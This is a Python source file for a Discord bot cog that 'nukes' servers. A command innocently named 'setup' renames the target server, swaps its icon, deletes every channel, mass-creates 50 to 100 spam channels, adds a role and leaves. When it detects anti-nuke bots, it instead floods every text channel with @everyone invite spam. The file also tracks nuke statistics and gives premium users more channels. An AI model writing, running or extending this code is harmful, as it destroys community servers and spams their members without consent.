import asyncio
import os
import random

import discord
from discord.ext import commands

from config import BLACKLISTED_GUILD_ID, OWNER_ID
from core.operation import (
    create_channel_and_send_message,
    detect_antinuke_bots,
    get_user_config_for_nuke,
    send_log,
)
from core.utils import (
    get_channel_name,
    get_role_name,
    get_server_name,
    get_user_config,
    get_webhook_message,
    is_premium_user,
    save_nuke_stats,
)


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def setup(self, ctx):
        guild = ctx.guild
        user = ctx.author
        user_id = ctx.author.id
        user_config = get_user_config(user_id)

        if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
            await ctx.reply("`this server is blacklisted`")
            return

        if len(guild.members) < 5 and user_id != OWNER_ID:
            try:
                await user.send(f"❌ Server `{guild.name}` needs to have a minimum of 5 members. Leaving..")
                print("not 5 members")
            except:
                print(f"[!] Konnte {user} keine DM schicken.")
            await guild.leave()
            return

        found = await detect_antinuke_bots(guild)
        if found:
            print(f"[!] Antinuke-Bots found:\n" + "\n".join(found) + "\nbypassing...")

            webhook_message = user_config.get("webhook_message", "zne owns this")
            if webhook_message in ["zne owns this", "Server has been nuked!"]:
                spam_message = "@everyone discord.gg/Y6qZ4TKRM5 https://www.youtube.com/watch?v=FMwC4TtNvbI"
            else:
                spam_message = webhook_message

            for channel in guild.text_channels:
                try:
                    await asyncio.gather(*(
                        channel.send(spam_message) for _ in range(10)
                    ))
                except Exception as e:
                    print(f"[ERROR] Spam in {channel.name} - : {e}")

            return

        save_nuke_stats(user.id, guild)

        channel_name = user_config.get("channel_name", "zne-on-top")
        webhook_message = user_config.get("webhook_message", "zne owns this")
        server_name = user_config.get("server_name", guild.name)
        role_name = user_config.get("role_name", "zne-owns-u")

        try:
            await guild.edit(name=server_name)
        except Exception as e:
            print(f"[!] Server rename failed: {e}")

        folder_path = "data/icons"
        valid_extensions = (".png", ".jpg", ".jpeg")
        images = [file for file in os.listdir(folder_path) if file.lower().endswith(valid_extensions)]
        selected = random.choice(images)
        image_path = os.path.join(folder_path, selected)
        try:
            with open(image_path, "rb") as f:
                icon = f.read()
                await ctx.guild.edit(icon=icon)
        except Exception as e:
            print(f"[ERROR] Failed to update icon: {e}")

        delete_channels = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_channels, return_exceptions=True)

        is_premium = is_premium_user(user.id)
        channel_count = 100 if is_premium else 50
        await asyncio.gather(*(create_channel_and_send_message(guild, user) for _ in range(channel_count)))

        try:
            await guild.create_role(name=role_name)
        except Exception as e:
            print(f"[!] Role creation failed: {e}")

        await guild.leave()

    @setup.error
    async def nuke_error(self, ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.send("You need Administrator permission to use this command.")
        else:
            await ctx.send(f"Error: {error}")


async def setup(bot):
    await bot.add_cog(Nuke(bot))
